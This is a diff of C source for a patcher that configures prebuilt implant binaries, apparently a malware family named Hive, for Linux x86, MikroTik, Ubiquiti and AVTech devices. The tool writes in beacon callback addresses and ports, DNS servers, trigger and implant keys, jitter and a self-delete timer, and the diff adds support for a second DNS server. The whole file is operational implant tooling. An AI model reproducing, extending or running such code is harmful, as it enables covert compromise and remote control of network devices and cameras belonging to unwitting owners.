@@ -58,41 +58,39 @@
 #define DEFAULT_BEACON_JITTER		3					// Default value is 3, range is from 0<=jitter<=30
 #define DEFAULT_SELF_DELETE_DELAY	60 * 24 * 60 * 60	// Default value is 60 days...
 
-struct cl_args {
-	unsigned int 	sig;
-	unsigned int 	beacon_port;
-	unsigned int 	host_len;
-	char 			beacon_ip[256];
-	char			dns_ip[16];
-	char			iface[16];
-	unsigned char	idKey[ID_KEY_HASH_SIZE];
+typedef enum {FALSE=0, TRUE} boolean;
+
+struct __attribute__ ((packed)) cl_args {
+	unsigned int	sig;
+	unsigned int	beacon_port;
+	unsigned int	trigger_delay;
 	unsigned long	init_delay;
 	unsigned int	interval;
-	unsigned int	trigger_delay;
 	unsigned int	jitter;
-	time_t			delete_delay;
-	char			sdpath[SD_PATH_LENGTH];
+	unsigned long	delete_delay;
 	unsigned int	patched;
-} __attribute__ ((packed));
-
-struct cl_args args = {
-		SIG_HEAD,
-		DEFAULT_BEACON_PORT,
-		0,
-		{0},
-		{0},
-		{0},
-		{0},
-		DEFAULT_INITIAL_DELAY,
-		DEFAULT_BEACON_INTERVAL,
-		DEFAULT_TRIGGER_DELAY,
-		DEFAULT_BEACON_JITTER,
-		DEFAULT_SELF_DELETE_DELAY,
-		"/var",
-		1
+	unsigned char   idKey[ID_KEY_HASH_SIZE];
+	char			sdpath[SD_PATH_LENGTH];
+	char			beacon_ip[256];
+	char			dns[2][16];
 };
 
-typedef enum {FALSE=0, TRUE} boolean;
+struct cl_args	args = {
+						SIG_HEAD,
+						DEFAULT_BEACON_PORT,
+						DEFAULT_TRIGGER_DELAY,
+						DEFAULT_INITIAL_DELAY,
+						DEFAULT_BEACON_INTERVAL,
+						DEFAULT_BEACON_JITTER,
+						DEFAULT_SELF_DELETE_DELAY,
+						1,
+						{0},
+						{0},
+						{0},
+						{{0}}
+};
+
+//********************************************************************************
 
 //define displaySha1Hash function
 void printSha1Hash(FILE *file, char *tag, unsigned char *sha1Hash)
@@ -124,7 +122,7 @@ int usage(char **argv)
 	fprintf(stdout, "    %s-j <b_jitter>%s      - beacon jitter (integer of percent variance between 0 and 30 [0-30] )\n", GREEN, RESET);
 	fprintf(stdout, "    %s-P <file path>%s     - (optional) self-delete control/log file directory path [default: /var]\n", GREEN, RESET);
 	fprintf(stdout, "    %s-p <port>%s          - (optional) beacon port [default: 443]\n", GREEN, RESET);
-	fprintf(stdout, "    %s-S <address>%s       - IP address the DNS server (required if beacon address a is domain name\n", GREEN, RESET);
+	fprintf(stdout, "    %s-S <address>%s       - IP address of the DNS server(s) (required if beacon address a is domain name\n", GREEN, RESET);
 	fprintf(stdout, "    %s-s <sd_delay>%s      - (optional) self delete delay since last successful trigger/beacon (in seconds) [default: 60 days]\n", GREEN, RESET);
 	fprintf(stdout, "    %s-t <t_delay>%s       - (optional) delay between trigger received & callback +/- 30 sec (in seconds) [default: 60 sec]\n", GREEN, RESET);
 	fprintf(stdout, "    %s-m <OS>%s            - (optional) target OS [default: 'all'].  options:\n", GREEN, RESET);
@@ -164,32 +162,31 @@ int RandFill(char *buf, int size)
 //********************************************************************************
 int main(int argc, char **argv)
 {
-	int optval;
-	int linux_x86 = 0;			// Linux x86
-	int mikrotik_x86 = 0;		// MikroTik x86
-	int mikrotik_mips = 0;		// MikroTik MIPS Big Endian
-	int mikrotik_ppc = 0;		// MikroTik PowerPC [Big Endian]
-	int ubiquiti_mips = 0;		// Ubiquiti MIPS Big Endian
-	int avtech_arm = 0;			// AVTech ARM
-	int raw = 0;				// unpatched versions
+	int				optval;
+	int				linux_x86 = 0;					// Linux x86
+	int 			mikrotik_x86 = 0;				// MikroTik x86
+	int 			mikrotik_mips = 0;				// MikroTik MIPS Big Endian
+	int 			mikrotik_ppc = 0;				// MikroTik PowerPC [Big Endian]
+	int 			ubiquiti_mips = 0;				// Ubiquiti MIPS Big Endian
+	int 			avtech_arm = 0;					// AVTech ARM
+	int 			raw = 0;						// unpatched versions
 
-	char 				*host = (char *) NULL;			// cached hostname for user confirmation message
-	FILE 				*implantIDFile;					// Used to save implant keys and subsequent sha1 hashes...
-	time_t 				currentTime;					// Time stamp for ID key generation
-	struct tm 			*idKeyTime;						// Pointer to the ID key generation data structure
-	unsigned char 		implantKey[ID_KEY_HASH_SIZE];
-	unsigned char 		triggerKey[ID_KEY_HASH_SIZE];
-	boolean 			keyed = FALSE;					// Boolean to verify that a key was entered
-
-	args.sig = SIG_HEAD;
+	char 			*host = (char *) NULL;			// cached hostname for user confirmation message
+	FILE 			*implantIDFile;					// Used to save implant keys and subsequent sha1 hashes...
+	time_t 			currentTime;					// Time stamp for ID key generation
+	struct tm 		*idKeyTime;						// Pointer to the ID key generation data structure
+	unsigned char	implantKey[ID_KEY_HASH_SIZE];
+	unsigned char	triggerKey[ID_KEY_HASH_SIZE];
+	boolean			keyed = FALSE;					// Boolean to verify that a key was entered
 
 	implantKey[0] = '\0';
+	args.sig = SIG_HEAD;
 
 	while ((optval = getopt(argc, argv, "+a:d:hI:i:j:K:k:m:P:p:S:s:t:")) != -1) {
 		switch (optval) {
 
 		case 'a':	// Hostname / IP address of beacon LP
-			if (strlen(optarg) > sizeof(args.beacon_ip)) {
+			if (strlen(optarg) >= sizeof(args.beacon_ip)) {
 				printf(" ERROR: Hostname or IP exceeds %d character limit\n", (int)sizeof(args.beacon_ip));
 				return -1;
 			}
@@ -330,7 +327,7 @@ int main(int argc, char **argv)
 
 		case 'P':	// Set path for self-delete control and log files
 			if (strlen(optarg) + 9 < SD_PATH_LENGTH) {	// Make sure array is large enough for filename, '/' and '\0'
-				strcpy(args.sdpath, optarg);		// Copy the path from the command line
+				strcpy(args.sdpath, optarg);			// Copy the path from the command line
 			} else {
 				fprintf(stderr, "ERROR: Directory path is too long (maximum 120 characters)");
 				return -1;
@@ -345,18 +342,38 @@ int main(int argc, char **argv)
 			}
 			break;
 
-		case 'S':	// DNS Server address
+		case 'S':	// DNS Server address(es) -- a comma separated list of up to two dotted quad addresses
 			{
-			char *address;
+				char *dns;
+				char *address_list;
 
-			address = optarg;
-			if (strlen(address) > 16) {
-				fprintf(stderr, "ERROR: DNS server address too long -- must be in dotted quad format (e.g. 192.168.53.53)\n");
-				return -1;
+				address_list = strdup(optarg);
+
+				// Get 1st DNS server address and validate its length
+				if ((dns = strtok(address_list, ","))) {
+					if (strlen(dns) > 16) {
+						fprintf(stderr, "ERROR: DNS server address too long -- must be in dotted quad format (e.g. 192.168.53.53)\n");
+						return -1;
+					}
+					memcpy(args.dns[0], dns, strlen(dns));
+				} else {
+					args.dns[0][0] = '\0';
+					fprintf(stderr, "Missing DNS address\n");
+					return -1;
+				}
+
+				// Get 2nd DNS server address if it was entered and validate its length
+				if ((dns = strtok(NULL, ","))) {
+					if (strlen(dns) > 16) {
+						fprintf(stderr, "ERROR: Second DNS server address too long -- must be in dotted quad format (e.g. 192.168.53.53)\n");
+						return -1;
+					}
+					memcpy(args.dns[1], dns, strlen(dns));
+				} else
+					args.dns[1][0] = '\0';
+				free(address_list);
 			}
-			strncpy(args.dns_ip, address, sizeof(args.dns_ip));
 			break;
-			}
 
 		case 's':	// self delete delay
 			args.delete_delay = strtoul(optarg, NULL, 10);
@@ -381,14 +398,30 @@ int main(int argc, char **argv)
 
 	{	// Validate IP addressing - must have a valid IP or a domain name
 		uint32_t	beaconIPaddr = 0;
-		if (strlen(args.dns_ip) == 0 && inet_pton(AF_INET, host, &beaconIPaddr) == 0) {
-			printf("%sError: The beacon address is invalid, or no DNS server address was specified.%s\n", RED, RESET);
-			return -1;
-		}
 
-		RandFill(args.beacon_ip, sizeof(args.beacon_ip));	// Fill/initialize field with random data
-		args.host_len = strlen(host);
-		memcpy(args.beacon_ip, host, args.host_len);		// Copy string representation of hostname or IP into the field
+		if (args.init_delay > 0) {			// Beacons enabled
+
+			if (args.beacon_port == 0) {
+				DLX(1, printf("No Beacon Port Specified!\n"));
+				DLX(1, printUsage(argv[0]));
+			}
+
+			// Obtain Beacon IP address
+			if (strlen(host) == 0) {
+					DLX(1, printf("No Beacon IP address specified!\n"));
+					DLX(1, printUsage(argv[0]));
+					return -1;
+			}
+
+			RandFill(args.beacon_ip, sizeof(args.beacon_ip));	// Fill/initialize field with random data
+			strcpy(args.beacon_ip, host);						// Copy string representation of hostname or IP into the field including the null byte
+			if (inet_pton(AF_INET, args.beacon_ip, &beaconIPaddr) <= 0) {		// Determine if beacon IP is a valid address
+				if (args.dns[0] == NULL) {										// If not, verify that a DNS server address was specified
+					DLX(1, printf("Beacon IP was specified as a domain name, but no valid DNS server address was specified to resolve the name!\n"));
+					return -1;
+				}
+			}
+		}
 	}
 
 	if (raw == 0) {
@@ -420,12 +453,12 @@ int main(int argc, char **argv)
 					avtech_arm = 1;
 		}
 
-
 		printf("\n");
 		printf("  This application will generate PATCHED files with the following values:\n\n");
 		printf("\t%32s: %-s\n", "Beacon Server IP address", host);
 		printf("\t%32s: %-d\n", "Beacon Server Port number", args.beacon_port);
-		printf("\t%32s: %-s\n", "DNS Server IP address", args.dns_ip);
+		printf("\t%32s: %-s\n", "Primary DNS Server IP address", args.dns[0]);
+		printf("\t%32s: %-s\n", "Secondary DNS Server IP address", args.dns[1]);
 		printf("\t%32s: ", "Trigger Key"); printSha1Hash(stdout, "", triggerKey); printf("\n");
 		printf("\t%32s: ", "Implant Key"); printSha1Hash(stdout, "", implantKey); printf("\n");
 		printf("\t%32s: %-lu\n", "Beacon Initial Delay (sec)", args.init_delay / 1000);
@@ -448,10 +481,10 @@ int main(int argc, char **argv)
 	if (avtech_arm == 1 || raw == 1)	printf("   . AVTech/ARM\n");
 
 	if (raw == 0) {
+		cl_string((unsigned char *) args.dns[0], sizeof(args.dns[0]));
+		cl_string((unsigned char *) args.dns[1], sizeof(args.dns[1]));
 		cl_string((unsigned char *) args.beacon_ip, sizeof(args.beacon_ip));
-		cl_string((unsigned char *) args.iface, sizeof(args.iface));
 		cl_string((unsigned char *) args.sdpath, sizeof(args.sdpath));
-		cl_string((unsigned char *) args.dns_ip, sizeof(args.dns_ip));
 	}
 
 	remove(HIVE_LINUX_X86_FILE);
@@ -566,7 +599,6 @@ int patch(char *filename, unsigned char *hexarray, unsigned int arraylen, struct
 	} else if (big_endian == 1) {
 		copy_of_args.sig = htonl(copy_of_args.sig);
 		copy_of_args.beacon_port = htonl(copy_of_args.beacon_port);
-		copy_of_args.host_len = htonl(copy_of_args.host_len);
 		copy_of_args.init_delay = htonl(copy_of_args.init_delay);
 		copy_of_args.interval = htonl(copy_of_args.interval);
 		copy_of_args.jitter = htonl(copy_of_args.jitter);
